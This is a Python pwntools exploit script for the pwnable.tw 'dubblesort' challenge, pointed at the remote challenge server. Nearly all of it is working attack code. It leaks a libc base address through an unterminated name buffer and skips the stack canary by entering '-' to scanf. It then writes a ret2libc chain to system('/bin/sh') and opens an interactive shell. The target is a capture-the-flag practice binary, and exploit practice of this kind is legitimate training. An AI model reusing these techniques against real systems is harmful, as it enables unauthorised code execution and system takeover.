#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./dubblesort')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('chall.pwnable.tw', 10101)
    libc = ELF('./libc_32.so.6')

sa('What your name :', 'A' * 0x1c)
ru('Hello ' + 'A' * 0x1c)
if local:
    libc_base = uu32(r(4)) - 0x184be
else:
    libc_base = uu32(r(4)) - 0x1ae244
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
info('binsh = ' + hex(binsh))
sla(',How many numbers do you what to sort :', str(35))
#gdb.attach(p, 'pie breakpoint 0x00000A95\nc')
#gdb.attach(p, 'pie breakpoint 0x00000AFE\nc')
for i in range(24):
    sla(' number : ', '1') # padding
sla(' number : ', '-') # dont write canary
for i in range(7):
    sla(' number : ', str(0xefff0000)) # padding larger than canary
# write rop chain
assert(system < binsh)
ret_addr = randint(system, binsh)
info('ret_addr = ' + hex(ret_addr))
sla(' number : ', str(system))
sla(' number : ', str(ret_addr)) # return address
sla(' number : ', str(binsh))

p.interactive()

